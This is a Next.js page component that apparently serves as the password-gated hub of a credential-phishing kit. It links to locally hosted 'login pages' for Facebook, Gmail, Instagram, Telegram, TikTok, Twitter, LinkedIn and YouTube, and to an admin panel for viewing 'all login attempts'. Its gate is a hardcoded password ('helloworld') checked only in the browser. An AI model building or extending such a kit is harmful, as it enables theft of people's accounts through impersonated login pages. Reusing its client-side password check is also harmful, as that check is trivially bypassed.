"use client"
import { useState, useEffect } from "react"
import Link from "next/link"
import { Facebook, Mail, Instagram, Send, Music, Twitter, Linkedin, Youtube, Lock } from "lucide-react"

export default function HomePage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [password, setPassword] = useState("")
  const [error, setError] = useState("")
  const [loading, setLoading] = useState(true)

  const correctPassword = "helloworld"

  const platforms = [
    {
      name: "Facebook",
      icon: Facebook,
      href: "/facebook",
      color: "bg-blue-600 hover:bg-blue-700",
      textColor: "text-white",
    },
    {
      name: "Gmail",
      icon: Mail,
      href: "/gmail",
      color: "bg-red-500 hover:bg-red-600",
      textColor: "text-white",
    },
    {
      name: "Instagram",
      icon: Instagram,
      href: "/instagram",
      color:
        "bg-gradient-to-r from-purple-500 via-pink-500 to-orange-400 hover:from-purple-600 hover:via-pink-600 hover:to-orange-500",
      textColor: "text-white",
    },
    {
      name: "Telegram",
      icon: Send,
      href: "/telegram",
      color: "bg-blue-500 hover:bg-blue-600",
      textColor: "text-white",
    },
    {
      name: "TikTok",
      icon: Music,
      href: "/tiktok",
      color: "bg-black hover:bg-gray-800",
      textColor: "text-white",
    },
    {
      name: "Twitter",
      icon: Twitter,
      href: "/twitter",
      color: "bg-sky-500 hover:bg-sky-600",
      textColor: "text-white",
    },
    {
      name: "LinkedIn",
      icon: Linkedin,
      href: "/linkedin",
      color: "bg-blue-700 hover:bg-blue-800",
      textColor: "text-white",
    },
    {
      name: "YouTube",
      icon: Youtube,
      href: "/youtube",
      color: "bg-red-600 hover:bg-red-700",
      textColor: "text-white",
    },
  ]

  useEffect(() => {
    // Check if user is already authenticated
    const authStatus = sessionStorage.getItem("homepage_authenticated")
    if (authStatus === "true") {
      setIsAuthenticated(true)
    }
    setLoading(false)
  }, [])

  const handlePasswordSubmit = (e) => {
    e.preventDefault()
    setError("")

    if (password === correctPassword) {
      setIsAuthenticated(true)
      sessionStorage.setItem("homepage_authenticated", "true")
      setPassword("")
    } else {
      setError("Incorrect password. Please try again.")
      setPassword("")
    }
  }

  const handleLogout = () => {
    setIsAuthenticated(false)
    sessionStorage.removeItem("homepage_authenticated")
  }

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
      </div>
    )
  }

  if (!isAuthenticated) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center px-4">
        <div className="max-w-md w-full">
          <div className="bg-white rounded-xl shadow-2xl p-8 border border-gray-200">
            <div className="text-center mb-8">
              <div className="w-16 h-16 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <Lock className="w-8 h-8 text-white" />
              </div>
              <h1 className="text-2xl font-bold text-gray-800 mb-2">Access Required</h1>
              <p className="text-gray-600">Please enter the password to access the homepage</p>
            </div>

            <form onSubmit={handlePasswordSubmit} className="space-y-6">
              <div>
                <label htmlFor="password" className="block text-sm font-medium text-gray-700 mb-2">
                  Password
                </label>
                <input
                  type="password"
                  id="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter password"
                  className={`w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 transition-colors ${error
                    ? "border-red-500 focus:ring-red-500 focus:border-red-500"
                    : "border-gray-300 focus:ring-blue-500 focus:border-blue-500"
                    }`}
                  required
                  autoFocus
                />
                {error && <p className="text-red-500 text-sm mt-2">{error}</p>}
              </div>

              <button
                type="submit"
                className="w-full bg-blue-600 text-white py-3 px-4 rounded-lg font-semibold hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition-colors"
              >
                Access Homepage
              </button>
            </form>

            <div className="mt-6 text-center">
              <p className="text-xs text-gray-500">This page is password protected for security purposes</p>
            </div>
          </div>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 py-12 px-4">
      <div className="max-w-6xl mx-auto">
        {/* Logout Button */}
        <div className="flex justify-end mb-4">
          <button
            onClick={handleLogout}
            className="px-4 py-2 bg-red-600 text-white rounded-lg text-sm font-medium hover:bg-red-700 transition-colors"
          >
            Logout
          </button>
        </div>

        <div className="text-center mb-12">
          <h1 className="text-4xl font-bold text-gray-800 mb-4">Social Media Login Hub</h1>
          <p className="text-lg text-gray-600">Access all your favorite social platforms in one place</p>
        </div>

        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
          {platforms.map((platform) => {
            const IconComponent = platform.icon
            return (
              <Link
                key={platform.name}
                href={platform.href}
                className={`${platform.color} ${platform.textColor} rounded-xl p-6 text-center transition-all duration-300 transform hover:scale-105 shadow-lg hover:shadow-xl`}
              >
                <IconComponent className="w-12 h-12 mx-auto mb-3" />
                <h3 className="text-lg font-semibold">{platform.name}</h3>
              </Link>
            )
          })}
        </div>

        <div className="text-center mt-12">
          <p className="text-gray-500 text-sm mb-4">Click on any platform to access its login page</p>

          {/* Admin Panel Link */}
          <div className="mt-8 p-6 bg-white rounded-xl shadow-lg border-2 border-dashed border-gray-300">
            <h3 className="text-xl font-semibold text-gray-800 mb-2">Admin Panel</h3>
            <p className="text-gray-600 mb-4">View and manage all login attempts</p>
            <Link
              href="/admin"
              className="inline-flex items-center px-6 py-3 bg-gray-800 text-white rounded-lg font-semibold hover:bg-gray-900 transition-colors"
            >
              <span className="mr-2">⚙️</span>
              Access Admin Panel
            </Link>
          </div>
        </div>
      </div>
    </div>
  )
}
